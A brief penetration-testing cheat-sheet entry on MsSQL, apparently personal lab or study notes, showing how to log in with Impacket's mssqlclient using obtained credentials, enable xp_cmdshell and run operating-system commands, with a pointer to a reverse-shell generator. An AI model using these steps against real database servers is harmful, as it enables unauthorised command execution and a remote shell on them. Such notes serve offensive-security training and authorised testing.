# MsSQL

## Impacket mssqlclient.py
On Kali it is installed as `impacket-mssqlclient`
I used it after obtaining credentials another way
```
impacket-mssqlclient [[domain/]username[:password]@]<targetName or address> -windows-auth
```
After authenticating
```
enable_xp_cmdshell
RECONFIGURE
xp_cmdshell <command to execute>

# Simple reverse shell
# https://www.revshells.com/
# PowerShell #3 (Base64)
```
